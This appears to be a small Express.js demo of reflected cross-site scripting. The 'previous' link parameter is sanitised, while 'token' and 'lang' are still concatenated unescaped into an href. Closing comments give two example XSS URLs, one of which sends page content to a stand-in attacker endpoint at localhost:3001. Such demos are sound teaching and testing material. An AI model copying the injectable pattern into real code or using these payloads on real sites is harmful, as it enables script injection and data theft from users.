const express = require('express');
const he = require('he');

const app = express();

function safeHref(input) {
  if(!input) return '#';

  // Only allow relative URLs
  if(input.startsWith('/')) return input;

  // Or allow only http(s)
  try {
    const u = new URL(input);
    if(u.protocol === 'http:' || u.protocol === 'https:') {
      return u.href;
    }
  } catch { }

  return '#';
}

app.get('/', (req, res) => {
  const { previous, lang, token } = req.query;

  getServiceStatus((status) => {
    // const href = `${he.encode(previous || '')}${he.encode(token || '')}${he.encode(lang || '')}`;
    const href = `${safeHref(previous || '')}${token || ''}${lang || ''}`;
    res.send(`
      <h1>Service Status</h1>
      <div id="status">${status}</div>
      <div>
        <a href="${href}">Go Back</a>
      </div>
    `);
  });
});

getServiceStatus = (callback) => {
  const status = 'All systems operational';
  callback(status);
}

app.listen(3000, () => {
  console.log('Server is running on http://localhost:3000');
});

// Example request to craft XSS attack:
// http://localhost:3000/?previous=%22%3E%3Cscript%3Edocument.getElementById(%22status%22).innerHTML=%22Hacked!%22;%3C/script%3E%20%3Ca%20href=%22/
// http://localhost:3000/?previous=javascript:(new%20Image()).src=`http://localhost:3001/attack/${btoa(document.getElementById(%22status%22).innerHTML)}`
